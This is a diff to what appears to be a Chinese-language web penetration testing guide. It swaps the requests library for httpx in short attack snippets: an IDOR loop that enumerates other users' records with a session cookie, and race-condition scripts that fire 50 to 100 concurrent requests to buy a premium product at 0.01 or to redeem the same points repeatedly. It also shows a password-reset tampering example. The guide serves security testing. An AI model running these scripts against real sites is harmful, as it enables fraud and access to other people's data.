@@ -42,7 +42,7 @@ GET /address/edit/?addid=100002  → 他人的地址(越权)
 # IDOR自动化检测思路
 def idor_test(base_url, param_name, id_range, session_cookie):
     for id in range(id_range[0], id_range[1]):
-        resp = requests.get(
+        resp = httpx.get(
             f"{base_url}?{param_name}={id}",
             cookies={"session": session_cookie}
         )
@@ -166,7 +166,7 @@ Phase 4: 支付流程各环节校验
 # 价格篡改+并发竞争
 import threading
 def create_order():
-    requests.post("/order/create", json={"price":0.01,"productId":"premium"})
+    httpx.post("/order/create", json={"price":0.01,"productId":"premium"})
 threads = [threading.Thread(target=create_order) for _ in range(50)]
 for t in threads: t.start()
 ```
@@ -308,7 +308,7 @@ username=victim&newPassword=hacked123
 ```python
 import threading, requests
 def redeem():
-    requests.post("/redeem", data={"points":1000, "item":"iPhone"})
+    httpx.post("/redeem", data={"points":1000, "item":"iPhone"})
 
 # 并发100次，尝试多次兑换同一份积分
 threads = [threading.Thread(target=redeem) for _ in range(100)]
